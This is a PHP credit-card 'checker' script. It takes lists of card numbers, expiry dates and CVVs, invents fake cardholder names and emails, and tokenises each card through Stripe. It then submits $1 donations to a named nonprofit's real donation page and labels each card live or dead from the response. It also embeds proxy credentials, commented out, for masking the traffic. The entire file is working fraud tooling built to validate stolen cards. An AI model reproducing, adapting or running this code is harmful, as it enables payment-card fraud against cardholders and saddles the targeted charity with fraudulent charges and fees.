<?php
    
    error_reporting(0);
    
 	//BY PINKY
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
	
	$lista = "$cc|$mes|$ano|$cvv";
	
    }

	
	function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
	}
	
	
$bin = substr($cc, 0, 6);
$bin = getBin($bin);	
	function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    function email($nome){
        $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@bol.com.br";
        return $email;
    }                                 
    $nome = dadosnome();
    $sobrenome = dadossobre();
    $email = email($nome);
    $keys = array(
	1 => 'pk_live_wiioL4zyDRkynifNw0F1l1nX'
	); 
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
$username = 'lum-customer-hl_f4125988-zone-static';
$password = 'qs6on7nu7so0';
$port = 22225; 
$session = mt_rand(); 
$super_proxy = 'zproxy.lum-superproxy.io';

 $ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port"); 
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'content-type: application/x-www-form-urlencoded',
                  
                  'origin: https://js.stripe.com',
                  'referer: https://js.stripe.com/v3/controller-30bca6cf335536f323f04d04e37d633c.html',
                  'sec-fetch-mode: cors',
                  'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44', ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
                  'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[address][postal_code]=34249&guid=9cf9d4a4-4f07-448c-bcff-4739832409a8&muid=17b8eb76-6cff-46f5-a45a-729a37903d4f&sid=bfe62406-40a3-4033-91ed-eb2b4031c01d&pasted_fields=number&payment_user_agent=stripe.js%2Fef3ed767%3B+stripe-js-v3%2Fef3ed767&referrer=https%3A%2F%2Fmy.ilga-europe.org%2Fcivicrm%2Fcontribute%2Ftransact%3Freset%3D1%26id%3D9&key=pk_live_62EQzutoxF2NSI4GVmonNiTx');
$result = curl_exec($ch);
$token = trim(strip_tags(getStr2($result,'"id": "','"')));

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[End Point Gateway Info]++++++++++++++++++++++++++++++++++++++++++++++++++++

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://my.ilga-europe.org/civicrm/stripe/confirm-payment');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'content-type: application/x-www-form-urlencoded; charset=UTF-8',
                
                  'origin: https://my.ilga-europe.org',
                  'referer: https://my.ilga-europe.org/civicrm/contribute/transact?reset=1&id=9',
                  'Sec-Fetch-Mode: cors',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
                'x-requested-with: XMLHttpRequest',));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
                  'payment_method_id='.$token.'&amount=1&currency=USD&id=9&description=Support+the+LGBTI+movement+in+Europe+and+Central+Asia+%7C+ILGA-Europe');

$result = curl_exec($ch);
$token = trim(strip_tags(getStr2($result,'"message":"','"')));
echo $result;

    if(strpos($result, 'security code is incorrect')) { 
        $retorno = getStr2($result, 'message": "', '",');
        $live = 
		'<td><span class="badge badge-success">Aprovada</span></td>
         <td><span class="badge badge-success">'.$lista.'</span></td>
         <td><span class="badge badge-warning">'.$bin.'</span></td>
		 <td><span class="badge badge-primary">'.$key.'</span></td>
         <td><span class="badge badge-success">CODE_INCORRECT</span></td>
         <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
        echo $live;
      }elseif(strpos($result, '"pass"')){ 
        $retorno = getStr2($result, 'message": "', '",');
        $live = 
        '<td><span class="badge badge-success">Aprovada</span></td>
         <td><span class="badge badge-success">'.$lista.'</span></td>
         <td><span class="badge badge-warning">'.$bin.'</span></td>
         <td><span class="badge badge-primary">'.$key.'</span></td>
         <td><span class="badge badge-warning">'.$token.'</span></td>
         <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
        echo $live;
    }elseif(strpos($result, 'processing')){ 
        $retorno = getStr2($result, 'message": "', '",');
        $live = 
		'<td><span class="badge badge-success">Aprovada</span></td>
         <td><span class="badge badge-success">'.$lista.'</span></td>
         <td><span class="badge badge-warning">'.$bin.'</span></td>
		 <td><span class="badge badge-primary">'.$key.'</span></td>
         <td><span class="badge badge-warning">PROCESSING_ERROR</span></td>
         <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
        echo $live;
    }elseif(strpos($result, 'true')){ 
        $retorno = getStr2($result, 'message": "', '",');
        $live = 
        '<td><span class="badge badge-success">Aprovada</span></td>
         <td><span class="badge badge-success">'.$lista.'</span></td>
         <td><span class="badge badge-warning">'.$bin.'</span></td>
         <td><span class="badge badge-primary">'.$key.'</span></td>
         <td><span class="badge badge-warning">CARD_CHARGED</span></td>
         <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
        echo $live;
    }elseif(strpos($result, 'message')){
        $retorno = getStr2($result, 'message": "', '",');
        echo 
		'<td><span class="badge badge-danger">Reprovada</span></td>
        <td><span class="badge badge-success">'.$lista.'</span></td>
        <td><span class="badge badge-warning">'.$bin.'</span></td>
		<td><span class="badge badge-primary">'.$key.'</span></td>		
        <td><span class="badge badge-danger">'.$token.'</span></td>
        <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
        
    }elseif(strpos($result, 'Your card number is incorrect.')){
        $retorno = getStr2($result, 'message": "', '",');
        echo 
        '<td><span class="badge badge-danger">Reprovada</span></td>
        <td><span class="badge badge-success">'.$lista.'</span></td>
        <td><span class="badge badge-warning">'.$bin.'</span></td>
        <td><span class="badge badge-primary">'.$key.'</span></td>      
        <td><span class="badge badge-danger">'.$token.'</span></td>
        <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
      }elseif(strpos($result, 'insufficient funds.')){
        $retorno = getStr2($result, 'message": "', '",');
        echo 
        '<td><span class="badge badge-success">Reprovada</span></td>
        <td><span class="badge badge-success">'.$lista.'</span></td>
        <td><span class="badge badge-warning">'.$bin.'</span></td>
        <td><span class="badge badge-primary">'.$key.'</span></td>      
        <td><span class="badge badge-success">'.$token.'</span></td>
        <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
    }elseif(strpos($result, 'token')){
        echo 
		'<td><span class="badge badge-danger">Reprovada</span></td>
        <td><span class="badge badge-success">'.$lista.'</span></td>
        <td><span class="badge badge-warning">'.$bin.'</span></td>
		<td><span class="badge badge-primary">'.$key.'</span></td>		
        <td><span class="badge badge-dark">GATE_ERROR</span></td>
        <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
    }else {
        echo 
		'<td><span class="badge badge-danger">Reprovada</span></td>
        <td><span class="badge badge-success">'.$lista.'</span></td>
        <td><span class="badge badge-warning">'.$bin.'</span></td>
        <td><span class="badge badge-dark">UNKNOWN_ERROR</span></td>
        <td><span class="badge badge-primary">ᏆhᎬ ᏆᎬᏟhᏒᎥm</span></td></tr>';
    }
    ?>

